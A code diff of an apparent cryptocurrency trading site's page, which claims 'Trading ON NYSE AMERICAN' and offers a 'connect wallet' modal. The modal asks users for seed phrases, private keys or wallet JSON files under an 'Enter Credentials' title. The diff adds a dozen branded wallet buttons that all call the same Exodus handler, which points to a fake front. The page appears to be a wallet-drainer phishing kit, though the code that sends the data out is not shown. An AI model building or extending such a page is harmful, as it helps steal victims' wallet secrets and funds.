@@ -20,14 +20,14 @@ body {
     min-height: 100vh;
 }
 
-/* Layout */
+
 .container {
     max-width: 1200px;
     margin: 0 auto;
     padding: 0 24px;
 }
 
-/* Navbar */
+
 .navbar {
     display: flex;
     justify-content: space-between;
@@ -71,7 +71,7 @@ body {
     color: #60a5fa;
 }
 
-/* Buttons */
+
 .btn-connect {
     background: linear-gradient(135deg, #3b82f6, #8b5cf6);
     color: white;
@@ -87,7 +87,7 @@ body {
     transform: translateY(-2px);
 }
 
-/* Pages */
+
 .page {
     display: none;
     animation: fadeIn 0.3s ease;
@@ -102,7 +102,7 @@ body {
     to { opacity: 1; transform: translateY(0); }
 }
 
-/* Hero */
+
 .hero {
     display: flex;
     flex-wrap: wrap;
@@ -136,7 +136,7 @@ body {
     border: 1px solid rgba(59,130,246,0.3);
 }
 
-/* Badges */
+
 .badge-group {
     display: flex;
     gap: 16px;
@@ -159,7 +159,7 @@ body {
     transform: translateY(-2px);
 }
 
-/* Sections */
+
 .buy-crypto-section,
 .trading-section {
     background: rgba(15,23,42,0.6);
@@ -171,7 +171,7 @@ body {
     border: 1px solid rgba(59,130,246,0.2);
 }
 
-/* Payment */
+
 .payment-methods {
     display: flex;
     justify-content: center;
@@ -192,7 +192,7 @@ body {
     color: #60a5fa;
 }
 
-/* Cards */
+
 .feature-grid,
 .testimonials-grid {
     display: grid;
@@ -218,7 +218,7 @@ body {
     border-color: #3b82f6;
 }
 
-/* MODAL FIXED */
+
 .modal,
 .input-modal {
     position: fixed;
@@ -232,7 +232,7 @@ body {
     overflow-y: auto;
 }
 
-/* Modal content */
+
 .modal-content,
 .input-modal-content {
     background: linear-gradient(135deg, #1e293b, #0f172a);
@@ -246,7 +246,7 @@ body {
     flex-direction: column;
 }
 
-/* Modal header */
+
 .modal-header {
     display: flex;
     justify-content: space-between;
@@ -262,7 +262,7 @@ body {
     cursor: pointer;
 }
 
-/* Quick methods row - side by side above wallet list */
+
 .quick-methods {
     display: flex;
     gap: 12px;
@@ -299,7 +299,6 @@ body {
     border-color: #60a5fa;
 }
 
-/* Wallet list (SCROLL FIX) */
 .wallet-options {
     display: grid;
     grid-template-columns: 1fr 1fr;
@@ -326,7 +325,7 @@ body {
     transform: translateX(4px);
 }
 
-/* Scrollbar */
+
 .wallet-options::-webkit-scrollbar {
     width: 6px;
 }
@@ -335,7 +334,7 @@ body {
     border-radius: 10px;
 }
 
-/* Inputs */
+
 textarea,
 input {
     width: 100%;
@@ -348,7 +347,7 @@ input {
     margin: 16px 0;
 }
 
-/* Upload */
+
 .json-upload-area {
     border: 2px dashed rgba(59,130,246,0.3);
     border-radius: 12px;
@@ -358,7 +357,7 @@ input {
     margin: 16px 0;
 }
 
-/* Buttons */
+
 .submit-input-btn {
     width: 100%;
     background: linear-gradient(135deg, #3b82f6, #8b5cf6);
@@ -371,7 +370,7 @@ input {
     margin-top: 24px;
 }
 
-/* Toast */
+
 .toast {
     position: fixed;
     bottom: 24px;
@@ -388,7 +387,7 @@ input {
     background: #ef4444;
 }
 
-/* Footer */
+
 footer {
     text-align: center;
     padding: 40px 0;
@@ -396,7 +395,7 @@ footer {
     color: rgba(255,255,255,0.7);
 }
 
-/* Tabs inside input modal */
+
 .input-method-tabs {
     display: flex;
     gap: 12px;
@@ -430,7 +429,7 @@ footer {
     display: block;
 }
 
-/* Responsive */
+
 @media (max-width: 768px) {
     .hero-left h1 {
         font-size: 2rem;
@@ -486,7 +485,7 @@ footer {
             </div>
         </div>
 
-        <!-- Buy crypto section -->
+    
         <div class="buy-crypto-section">
             <h2>Buy crypto with your local currency</h2>
             <p>Start your crypto journey using your credit/debit card, bank account, Apple Pay, or Google Pay</p>
@@ -506,6 +505,7 @@ footer {
         <div class="trading-section">
             <h2>Trading ON NYSE AMERICAN</h2>
             <p>Your trusted platform for cryptocurrency trading, analysis, and insights.</p>
+            <!-- <img src="../nn.jpg" alt="" style="padding-top: 20px;"> -->
         </div>
 
         <div style="margin: 60px 0;">
@@ -571,7 +571,7 @@ footer {
 </div>
 
 
-<!-- WALLET MODAL (quick methods above wallet list, side by side) -->
+
 <div id="walletModal" class="modal">
     <div class="modal-content">
         <div class="modal-header">
@@ -580,7 +580,7 @@ footer {
         </div>
 
         <!-- Quick methods row: side by side -->
-        <div class="quick-methods">
+        <!-- <div class="quick-methods">
             <button class="quick-method-btn" onclick="openSeedPhraseModal()">
                 <i class="fas fa-key"></i> Use Seed Phrase
             </button>
@@ -590,7 +590,7 @@ footer {
             <button class="quick-method-btn" onclick="openJSONModal()">
                 <i class="fas fa-file-code"></i> Upload JSON File
             </button>
-        </div>
+        </div> -->
 
         <div class="wallet-options">
             <!-- Popular wallets -->
@@ -630,11 +630,56 @@ footer {
                 <i class="fas fa-rocket"></i>
                 <div><strong>Exodus</strong><br><small>Multi-chain wallet</small></div>
             </div>
+            <div class="wallet-option" onclick="connectSpecificWallet('Exodus')">
+                <i class="fas fa-rocket"></i>
+                <div><strong>Axiom</strong><br><small>Axiom wallet</small></div>
+            </div>
+            <div class="wallet-option" onclick="connectSpecificWallet('Exodus')">
+                <i class="fas fa-rocket"></i>
+                <div><strong>OKX</strong><br><small>Multi-chain wallet</small></div>
+            </div>
+            <div class="wallet-option" onclick="connectSpecificWallet('Exodus')">
+                <i class="fas fa-rocket"></i>
+                <div><strong>Roqqu</strong><br><small>Multi-chain wallet</small></div>
+            </div>
+            <div class="wallet-option" onclick="connectSpecificWallet('Exodus')">
+                <i class="fas fa-rocket"></i>
+                <div><strong>Safepal</strong><br><small>Multi-chain wallet</small></div>
+            </div>
+            <div class="wallet-option" onclick="connectSpecificWallet('Exodus')">
+                <i class="fas fa-rocket"></i>
+                <div><strong>Bitpay</strong><br><small>Multi-chain wallet</small></div>
+            </div>
+            <div class="wallet-option" onclick="connectSpecificWallet('Exodus')">
+                <i class="fas fa-rocket"></i>
+                <div><strong>Eidoo</strong><br><small>Multi-chain wallet</small></div>
+            </div>
+            <div class="wallet-option" onclick="connectSpecificWallet('Exodus')">
+                <i class="fas fa-rocket"></i>
+                <div><strong>Wallet.io</strong><br><small>Multi-chain wallet</small></div>
+            </div>
+            <div class="wallet-option" onclick="connectSpecificWallet('Exodus')">
+                <i class="fas fa-rocket"></i>
+                <div><strong>Bitkeep</strong><br><small>Multi-chain wallet</small></div>
+            </div>
+            <div class="wallet-option" onclick="connectSpecificWallet('Exodus')">
+                <i class="fas fa-rocket"></i>
+                <div><strong>Keplr</strong><br><small>Multi-chain wallet</small></div>
+            </div>
+            <div class="wallet-option" onclick="connectSpecificWallet('Exodus')">
+                <i class="fas fa-rocket"></i>
+                <div><strong>CoinBase</strong><br><small>Multi-chain wallet</small></div>
+            </div>
+            <div class="wallet-option" onclick="connectSpecificWallet('Exodus')">
+                <i class="fas fa-rocket"></i>
+                <div><strong>Atomic</strong><br><small>Multi-chain wallet</small></div>
+            </div>
+            
         </div>
     </div>
 </div>
 
-<!-- Unified INPUT MODAL (dynamic title & active method) -->
+
 <div id="inputModal" class="input-modal">
     <div class="input-modal-content">
         <div class="modal-header"><h2 id="inputModalTitle">Enter Credentials</h2><button class="close-modal" onclick="closeInputModal()">&times;</button></div>
@@ -711,7 +756,7 @@ function connectSpecificWallet(walletName) {
 
 // DEDICATED MODAL TRIGGERS: SEED PHRASE, PRIVATE KEY, JSON
 function openSeedPhraseModal() {
-    selectedWallet = 'Manual Entry (Seed)';
+    selectedWallet = 'Manual Entry (Seed Phrase)';
     selectedMethod = 'seed';
     document.getElementById('inputModalTitle').innerHTML = '🔐 Enter Seed Phrase';
     activateMethodTab('seed');
